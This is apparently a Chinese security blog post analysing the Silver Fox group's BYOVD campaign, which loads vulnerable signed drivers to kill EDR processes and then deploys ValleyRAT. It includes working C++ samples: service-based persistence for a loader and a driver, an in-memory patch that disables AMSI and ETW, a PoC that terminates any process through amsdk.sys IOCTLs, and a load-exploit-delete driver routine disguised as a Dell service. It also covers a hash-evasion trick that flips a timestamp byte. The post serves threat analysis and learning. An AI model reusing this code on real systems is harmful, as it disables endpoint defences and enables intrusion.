---
layout:     post                       
title:     Silver Fox-BYOVD与内存攻击链
subtitle:   
date:       2025-09-06       
author:     Closure                         
header-img: img/fm1.jpg
catalog: true                         
tags:                               
    - 笔记
    - 安全
---

[CHASING THE SILVER FOX: CAT & MOUSE IN KERNEL SHADOWS](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/#:~:text=Each%20malware%20sample%20we%20analyzed,one%20loader%2C%20composed%20of "CHASING THE SILVER FOX: CAT & MOUSE IN KERNEL SHADOWS")

又是银狐()最近他们攻击活动是个一体化的恶意软件加载器。

内部封装了加载器存根作为整个攻击的起点，负责初始执行、环境检测、持久化设置。还有两个内嵌的脆弱驱动程序，加载器内部捆绑了两个不同的但都存在漏洞的合法驱动程序，来用于后续的权限提升。以及EDR/AV查杀模块，包含一个硬编码的列表列出了主流端点安全产品的进程名称，主要是为了利用脆弱驱动程序提供的能力，来精确地终止这些安全进程。最后一个是ValleyRAT下载器模块，系统的防御解除后模块被激活，负责连接到c2下载最终的ValleyRAT。

为了最大化攻击覆盖范围和成功率，银狐的是双驱动策略，分为win7这种老旧系统和win10这种现代系统。

像win7这类的安全防护相对较弱的系统，加载器会选择部署一个已知存在漏洞的Zemana反病毒软件驱动程序，虽然这个驱动程序的漏洞被公开很久了，而且现在很多现代安全产品都把他列入黑名单，但是在老旧系统上依然是一个非常有效的攻击工具。

对于这些配备了更强内核保护机制的，像win1这样的现代操作系统，银狐使用了一个前所未见的零日脆弱驱动程序，WatchDog，反恶意软件驱动程序的1.0.600版本（amsdk.sys），这个驱动程序是此次攻击的关键所在，虽然它拥有合法的微软数字签名，但是内部存在一个致命缺陷可以被用来终止系统中的任意进程。而且在攻击发生的时候amsdk.sys并未被微软官方的脆弱驱动程序阻止列表或LOLDrivers等社区项目所收录 。

利用BYOVD的主要目的是获取在操作系统内核层面的高级权限，比如任意进程终止和本地权限提升的，获得了这种内核级的上帝权限后基本上畅通无阻了，所以攻击核心目标是破坏Windows的PPL机制。这个是Windows 8.1引入的一项安全特性，为了保护操作系统核心服务和如EDR和AV这些第三方软件的进程，来防止它们被非受信的代码篡改，正常情况下即便是管理员权限的进程也无法终止一个受PPL保护的进程。

但是通过利用amsdk.sys或ZAM.exe驱动程序的漏洞可以从内核层面发起终止指令来绕过PPL的限制。加载器中的查杀逻辑模块会遍历其硬编码的安全产品列表，一旦发现匹配的进程就调用驱动程序的功能来强制终止。

当目标系统全部都被蒙蔽之后，攻击的最后阶段就开始了，加载器会执行ValleyRAT下载器，根据预设好的的配置连接到由攻击者控制的C2，来下载功能完备的ValleyRAT后门程序。

**使用SCM API来创建和启动上述两种类型的服务，代码分为两个函数，一个用于创建标准的可执行文件服务，一个用于创建内核驱动服务。**

```cpp
#include <iostream>
#include <windows.h>
#include <string>

// 函数：创建一个用于加载可执行文件的 Windows 服务。
// 参数：
//   serviceName - 服务的内部名称。
//   displayName - 服务在服务管理器中显示的名称。
//   binaryPath - 可执行文件的完整路径。
// 返回值：如果成功，返回 true；否则返回 false。
bool CreateExecutableService(const std::wstring& serviceName, const std::wstring& displayName, const std::wstring& binaryPath) {
    SC_HANDLE schSCManager = NULL;
    SC_HANDLE schService = NULL;
    bool success = false;

    // 1. 打开服务控制管理器数据库
    schSCManager = OpenSCManager(
        NULL,                    // 本地计算机
        NULL,                    // ServicesActive 数据库
        SC_MANAGER_CREATE_SERVICE // 请求创建服务的权限
    );
    if (NULL == schSCManager) {
        std::cerr << "OpenSCManager failed: " << GetLastError() << std::endl;
        return false;
    }

    // 2. 创建服务
    schService = CreateServiceW(
        schSCManager,              // SCM 数据库句柄
        serviceName.c_str(),       // 服务名称
        displayName.c_str(),       // 服务显示名称
        SERVICE_ALL_ACCESS,        // 请求完全访问权限
        SERVICE_WIN32_OWN_PROCESS, // 服务类型：独立进程
        SERVICE_AUTO_START,        // 启动类型：自动
        SERVICE_ERROR_NORMAL,      // 错误控制类型
        binaryPath.c_str(),        // 服务的二进制文件路径
        NULL,                      // 无加载顺序组
        NULL,                      // 无标签标识符
        NULL,                      // 无依赖项
        NULL,                      // 使用 LocalSystem 账户
        NULL                       // 无密码
    );

    if (schService == NULL) {
        std::cerr << "CreateService failed: " << GetLastError() << std::endl;
    } else {
        std::wcout << L"Service '" << serviceName << L"' created successfully." << std::endl;
        success = true;
        CloseServiceHandle(schService); // 关闭服务句柄
    }

    CloseServiceHandle(schSCManager); // 关闭 SCM 句柄
    return success;
}

// 函数：创建一个用于加载内核驱动的 Windows 服务。
// 参数：
//   serviceName - 服务的内部名称。
//   displayName - 服务在服务管理器中显示的名称。
//   driverPath -.sys 驱动文件的完整路径。
// 返回值：如果成功，返回 true；否则返回 false。
bool CreateDriverService(const std::wstring& serviceName, const std::wstring& displayName, const std::wstring& driverPath) {
    SC_HANDLE schSCManager = NULL;
    SC_HANDLE schService = NULL;
    bool success = false;

    schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (NULL == schSCManager) {
        std::cerr << "OpenSCManager failed: " << GetLastError() << std::endl;
        return false;
    }

    schService = CreateServiceW(
        schSCManager,
        serviceName.c_str(),
        displayName.c_str(),
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,     // 服务类型：内核驱动
        SERVICE_SYSTEM_START,      // 启动类型：系统启动时加载（适用于驱动）
        SERVICE_ERROR_NORMAL,
        driverPath.c_str(),        // 驱动文件路径
        NULL, NULL, NULL, NULL, NULL
    );

    if (schService == NULL) {
        std::cerr << "CreateDriverService failed: " << GetLastError() << std::endl;
    } else {
        std::wcout << L"Driver Service '" << serviceName << L"' created successfully." << std::endl;
        success = true;
        
        // 尝试启动驱动服务
        if (!StartServiceW(schService, 0, NULL)) {
            // 如果启动失败，需要检查错误码。对于驱动，可能需要重启。
            if (GetLastError()!= ERROR_SERVICE_ALREADY_RUNNING) {
                 std::cerr << "StartService failed: " << GetLastError() << std::endl;
                 // 即使启动失败，创建本身也算成功，所以不改变 success 的值。
            }
        } else {
            std::wcout << L"Driver Service '" << serviceName << L"' started successfully." << std::endl;
        }

        CloseServiceHandle(schService);
    }

    CloseServiceHandle(schSCManager);
    return success;
}

int main() {
    // 示例路径，对应 Silver Fox 的行为
    const std::wstring loaderPath = L"C:\\Program Files\\RunTime\\RuntimeBroker.exe";
    const std::wstring driverPath = L"C:\\Program Files\\RunTime\\Amsdk_Service.sys";

    // 创建用于加载器的服务
    CreateExecutableService(L"Termaintor", L"Termaintor Service", loaderPath);

    // 创建用于加载驱动的服务
    CreateDriverService(L"Amsdk_Service", L"Amsdk Driver Service", driverPath);

    return 0;
}
```

### Windows内核安全与驱动签名

BYOVD之前，先讲一下现代Win系统的安全基石，操作系统被划分为User Mode和Kernel Mode，用户模式权限受到严格限制，内核模式拥有对系统所有硬件和内存的最高访问权限 。

为了保护内核的完整性防止恶意代码进入，微软引入了DES机制，在64位的Win系统上，DSE要求所有将要加载到内核的驱动程序都必须拥有一个有效的数字签名，这个签名要么来自微软，要么来自一个受信任的证书颁发机构。

银狐对BYOVD攻击就是利用了DSE建立的这个信任模型：

**Bring Your Own**：攻击者首先会寻找一个本身是合法的、拥有有效数字签名，但同时又存在已知或未知安全漏洞的驱动程序。这些漏洞通常允许从用户模式向驱动程序发送特定请求，从而在内核模式下执行某些越权操作（例如，读写任意内存、终止任意进程）。

**Load**：攻击者在获得目标系统的管理员权限后，会将这个“脆弱但合法”的驱动程序文件释放到磁盘上，并调用系统API来加载它。由于该驱动程序拥有有效的数字签名，DSE检查会顺利通过，操作系统会毫无戒备地将其加载到内核空间。

**Exploit**：一旦驱动程序进入内核，攻击者便可以通过其在用户模式下运行的恶意代码，与这个脆弱的驱动程序进行通信（通常通过DeviceIoControl API）。通过发送精心构造的请求，攻击者可以触发驱动程序中的漏洞，从而间接地在内核模式下执行恶意指令 。

综上，将操作系统的信任机制变成了我方武器。

值得一提的还有这次银狐对蓝队的反制措施，在amsdk.sys的漏洞被发现后开发商WatchDog迅速发布了修复版本，通常情况下蓝队会将旧的哈希值加入黑名单阻止加载，但是银狐搞了个很巧妙的规避手段。

银狐获取了已打补丁的新版驱动程序，然后分析驱动程序的PE，特别是Authenticode部分，他们发现签名中包含一个时间戳字段，这个字段记录了签名的时间，但是本身并不在被加密哈希计算的认证数据范围之内。

然后银狐对这个时间戳字段中的任意一个字节进行了修改，由于文件内容发生了变化，哪怕只有一个字节，这个文件的MD5和SHA256哈希值都将变得与原始的已打补丁驱动程序完全不同，所以所有依赖哈希值黑名单的防御系统都无法识别这个被修改过的文件。

但是因为被修改的时间戳字段不在签名的核心验证范围，所以Windows的签名验证算法在检查该文件时依然会判定其数字签名为有效。

这种应该叫单字节翻转技术（？），静态防御模式确实脆弱性可见一斑，只要攻击者能够找到文件结构中任何一个不影响核心功能和签名验证的区域进行微小修改，就可以近乎零成本地生成海量拥有全新哈希值的新恶意文件。

ValleyRAT为了躲避内存扫描和行为日志记录会直接在内存中修改amsi.dll和ntdll.dll中的关键函数，这是个伪代码（)

```cpp
#include <iostream>
#include <windows.h>

// 函数：对指定模块中的函数应用内存补丁，使其立即返回成功。
// 参数：
//   moduleName - 包含目标函数的模块名称 (如 "amsi.dll")。
//   functionName - 要修补的函数名称 (如 "AmsiScanBuffer")。
// 返回值：如果成功，返回 true；否则返回 false。
bool PatchFunctionInMemory(const char* moduleName, const char* functionName) {
    HMODULE hModule = GetModuleHandleA(moduleName);
    if (hModule == NULL) {
        hModule = LoadLibraryA(moduleName);
        if (hModule == NULL) return false;
    }

    FARPROC pFunction = GetProcAddress(hModule, functionName);
    if (pFunction == NULL) return false;

    // 准备补丁字节 (x64):
    // mov eax, 0      ; 返回 0 (表示成功或未检测到威胁)
    // ret
    unsigned char patch = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
    DWORD patchSize = sizeof(patch);

    DWORD oldProtect;
    if (!VirtualProtect((LPVOID)pFunction, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }

    // 写入补丁
    memcpy((void*)pFunction, patch, patchSize);

    // 恢复原始内存保护属性
    VirtualProtect((LPVOID)pFunction, patchSize, oldProtect, &oldProtect);

    return true;
}

int main() {
    // 禁用 AMSI 的核心扫描函数
    PatchFunctionInMemory("amsi.dll", "AmsiScanBuffer");

    // 禁用 ETW 的核心事件写入函数
    PatchFunctionInMemory("ntdll.dll", "EtwEventWrite");

    // 在此之后执行的恶意操作将更难被检测到
    return 0;
}
```

### BYOVD生态系统

好消息是BYOVD已经从国家级apt手段变成个人黑客也可以用的了hhh技术的扩散得益于开源社区和攻击工具的出现：[LOLDrivers](https://github.com/magicsword-io/LOLDrivers# "LOLDrivers")和[RealBlindingEDR](https://github.com/myzxcg/RealBlindingEDR "RealBlindingEDR")

这两个直接解决了**用什么和怎么用**两个问题。
 
LOLDrivers是一个公开的、不断更新的脆弱驱动程序数据库，它系统地收集和整理了数百个来自不同合法厂商拥有有效数字签名但已知存在安全漏洞的驱动程序。在LOLDrivers出现之前攻击者需要花费大量时间和精力去自己寻找或研究哪个驱动程序既能被系统信任加载又恰好存在可以利用的漏洞，这是一个技术门槛很高的工作。而LOLDrivers项目把这一切都做好了，起到了一个目录的作用。

![ ](/img/20250906-0.png)

像RealBlindingEDR这样的开源工具就是怎么做，这是一个专门用来禁用EDR安全产品的工具，的工作原理就是利用一个已知的脆弱驱动程序通过该驱动的漏洞获得内核权限，然后专门去破坏和终止EDR软件在内核中运行的组件。

![ ](/img/20250906-1.png)

![ ](/img/20250906-2.png)

![ ](/img/20250906-3.png)

**一个PoC，如何与已加载的amsdk.sys驱动程序进行交互来终止一个指定PID的进程**

```cpp
#include <iostream>
#include <windows.h>
#include <string>

// 定义 amsdk.sys 驱动程序使用的 IOCTL 控制代码
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

// 函数：利用 amsdk.sys 驱动终止指定进程
// 参数：
//   targetPid - 要终止的目标进程的 PID
// 返回值：如果操作成功，返回 true；否则返回 false。
bool TerminateProcessViaAmsdk(DWORD targetPid) {
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    BOOL bResult = FALSE;
    DWORD bytesReturned = 0;

    // 1. 使用 CreateFile 打开到驱动程序设备对象的句柄。
    // 驱动创建的设备对象允许通过 "\\.\amsdk\..." 路径访问。
    // "anyfile" 部分是任意的，因为驱动的实现不关心这部分。
    hDevice = CreateFileA(
        "\\\\.\\amsdk\\anyfile",
        GENERIC_READ | GENERIC_WRITE, // 请求读写权限
        0,                            // 不共享
        NULL,                         // 默认安全属性
        OPEN_EXISTING,                // 只打开已存在的设备
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open handle to the driver device. Error: " << GetLastError() << std::endl;
        std::cerr << "Ensure the amsdk.sys driver is loaded." << std::endl;
        return false;
    }

    std::cout << "Successfully opened handle to amsdk device." << std::endl;

    // 2. 第一步：注册当前进程，使其有权发送后续的 IOCTL 请求。
    // 这是驱动的一个内部安全机制，但由于可以被任何进程调用，所以形同虚设。
    DWORD currentPid = GetCurrentProcessId();
    bResult = DeviceIoControl(
        hDevice,                    // 设备句柄
        IOCTL_REGISTER_PROCESS,     // 控制代码：注册进程
        &currentPid,                // 输入缓冲区：当前进程 PID
        sizeof(currentPid),         // 输入缓冲区大小
        NULL,                       // 无输出缓冲区
        0,                          // 输出缓冲区大小
        &bytesReturned,             // 接收返回的字节数
        NULL
    );

    if (!bResult) {
        std::cerr << "DeviceIoControl (IOCTL_REGISTER_PROCESS) failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hDevice);
        return false;
    }
    
    std::cout << "Successfully registered current process (PID: " << currentPid << ") with the driver." << std::endl;

    // 3. 第二步：发送终止进程的请求。
    bResult = DeviceIoControl(
        hDevice,                    // 设备句柄
        IOCTL_TERMINATE_PROCESS,    // 控制代码：终止进程
        &targetPid,                 // 输入缓冲区：目标进程 PID
        sizeof(targetPid),          // 输入缓冲区大小
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!bResult) {
        std::cerr << "DeviceIoControl (IOCTL_TERMINATE_PROCESS) failed. Error: " << GetLastError() << std::endl;
        CloseHandle(hDevice);
        return false;
    }

    std::cout << "Successfully sent termination request for PID: " << targetPid << std::endl;

    CloseHandle(hDevice);
    return true;
}

int main(int argc, char* argv) {
    if (argc!= 2) {
        std::cout << "Usage: " << argv << " <PID_to_terminate>" << std::endl;
        return 1;
    }

    DWORD pid = std::stoul(argv);
    std::cout << "Attempting to terminate process with PID: " << pid << std::endl;

    // 在执行此 PoC 之前，必须确保 amsdk.sys 驱动已通过服务或其他方式加载到内核中。
    if (TerminateProcessViaAmsdk(pid)) {
        std::cout << "Termination command sent successfully." << std::endl;
    } else {
        std::cout << "Failed to send termination command." << std::endl;
    }

    return 0;
}
```

#### 假设一下获得目标权限后开始结合LOLDrivers和RealBlindingEDR

打开 LOLDrivers列表挑选一个合适的驱动程序，比如戴尔公司的dbutil_2_3.sys的驱动程序有一个漏洞可以被用来在内核里执行任意代码，这个驱动程序就是我们选中的马。

已经有管理员权限了，把这个dbutil_2_3.sys放到对面电脑的一个临时文件夹里，然后运行向Windows系统发出一个正常的请求请帮我加载 dbutil_2_3.sys这个驱动。这个时候Windows的DSE机制开始工作，它检查了这个驱动发现它拥有完全合法的数字签名。于是默认为自己人。  

此时，BYOVD已经在内核里待命，需要RealBlindingEDR 这样的开源工具开启，先调用RealBlindingEDR的代码模块，这个模块知道如何与dbutil_2_3.sys通信并能发送一个特殊的数据包来触发驱动程序的已知漏洞。触发后就通过这个脆弱驱动程序，在内核里可以读写任意内存，RealBlindingEDR的后续代码就会利用这个能力去精准地定位对面电脑上EDR安全软件在内核中的关键进程和回调函数，然后一一终止。

代码示例一下，ExecuteByovdAttack函数模拟了攻击者BYOVD和清除痕迹，首先连接到Windows服务控制管理器并为指定的驱动文件创建一个临时的内核服务，这里的启动类型被设置为 SERVICE_DEMAND_START而不是用于持久化的SERVICE_AUTO_START。

然后通过StartService函数启动该服务，立即将驱动程序加载到内核内存中。代码中明确地标记出了“EXPLOIT PHASE”，在这里调用CreateFile来打开与驱动的通信句柄，并使用DeviceIoControl发送恶意的IOCTL控制代码来触发漏洞。完成后调用ControlService和DeleteService来停止并删除刚刚创建的临时服务。

```cpp
#include <iostream>
#include <windows.h>
#include <string>

/**
 * @brief 动态加载、利用并卸载一个脆弱驱动，模拟一次完整的BYOVD攻击流程。
 * 
 * @param driverPath 脆弱驱动程序（.sys文件）的完整路径。
 * @param serviceName 用于临时加载驱动的服务名称，通常是随机或伪装的名称。
 * @return 如果所有步骤成功，则返回 true；否则返回 false。
 */
bool ExecuteByovdAttack(const std::wstring& driverPath, const std::wstring& serviceName) {
    // 1. 打开服务控制管理器
    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (schSCManager == NULL) {
        std::wcerr << L"OpenSCManager failed. Error: " << GetLastError() << std::endl;
        return false;
    }

    // 2. 创建一个临时的、手动启动的内核驱动服务
    SC_HANDLE schService = CreateServiceW(
        schSCManager,
        serviceName.c_str(),
        serviceName.c_str(),
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START, // 手动启动，用于临时加载
        SERVICE_ERROR_NORMAL,
        driverPath.c_str(),
        NULL, NULL, NULL, NULL, NULL);

    if (schService == NULL) {
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            // 如果服务已存在，则尝试打开它
            schService = OpenServiceW(schSCManager, serviceName.c_str(), SERVICE_ALL_ACCESS);
        }
        if (schService == NULL) {
            std::wcerr << L"CreateService/OpenService failed. Error: " << GetLastError() << std::endl;
            CloseServiceHandle(schSCManager);
            return false;
        }
    }

    // 3. 启动服务，将驱动加载到内核
    if (!StartServiceW(schService, 0, NULL)) {
        if (GetLastError()!= ERROR_SERVICE_ALREADY_RUNNING) {
            std::wcerr << L"StartService failed. Error: " << GetLastError() << std::endl;
            DeleteService(schService); // 尝试清理
            CloseServiceHandle(schService);
            CloseServiceHandle(schSCManager);
            return false;
        }
    }

    std::wcout << L"Vulnerable driver '" << driverPath << L"' loaded into kernel via service '" << serviceName << L"'." << std::endl;

    // 4. *** EXPLOIT PHASE (攻击利用阶段) ***
    // 此时，脆弱驱动已在内核运行。攻击代码将在这里执行。
    // 这通常涉及：
    // a. 使用 CreateFileW 打开一个到驱动设备对象的句柄 (例如 L"\\\\.\\dbutil_2_3")。
    // b. 使用 DeviceIoControl 发送一个精心构造的IOCTL请求来触发漏洞。
    //    这正是 RealBlindingEDR 这类工具的核心功能，它会利用驱动的漏洞
    //    去读写内核内存，从而定位并摘除EDR的内核回调或终止其保护进程。
    std::wcout << L"--> Placeholder: Executing exploit via DeviceIoControl to disable EDR..." << std::endl;
    // 示例: TerminateProcessViaAmsdk(target_pid); // 逻辑类似于您已有的amsdk PoC


    // 5. 清理战场：停止并删除服务，抹除痕迹
    SERVICE_STATUS serviceStatus;
    ControlService(schService, SERVICE_CONTROL_STOP, &serviceStatus);
    std::wcout << L"Stop command sent to service." << std::endl;

    if (!DeleteService(schService)) {
        std::wcerr << L"DeleteService failed. Error: " << GetLastError() << std::endl;
    } else {
        std::wcout << L"Temporary service '" << serviceName << L"' deleted successfully." << std::endl;
    }

    CloseServiceHandle(schService);
    CloseServiceHandle(schSCManager);

    return true;
}

int main() {
    // 模拟攻击者使用戴尔的脆弱驱动
    const std::wstring vulnerableDriverPath = L"C:\\Users\\Public\\dbutil_2_3.sys";
    const std::wstring tempServiceName = L"DellUtilSvc"; // 伪装成合法的服务名

    std::wcout << L"Starting BYOVD attack simulation..." << std::endl;
    ExecuteByovdAttack(vulnerableDriverPath, tempServiceName);
    std::wcout << L"Attack simulation finished." << std::endl;

    return 0;
}
```

自己确实还是以为拿到权限或者马放进去了就算完成的那种靶机心态，专业搞这个的APT拿到admin权限后的第一反应不是庆祝，而是焦虑。必须立刻利用这个短暂的窗口期，完成从一个管理员到内核级Rootkit的转变，怪不得看都是不惜一切代价追求内核控制权，原来是在内核才能真正把EDR搞瘫。。。。


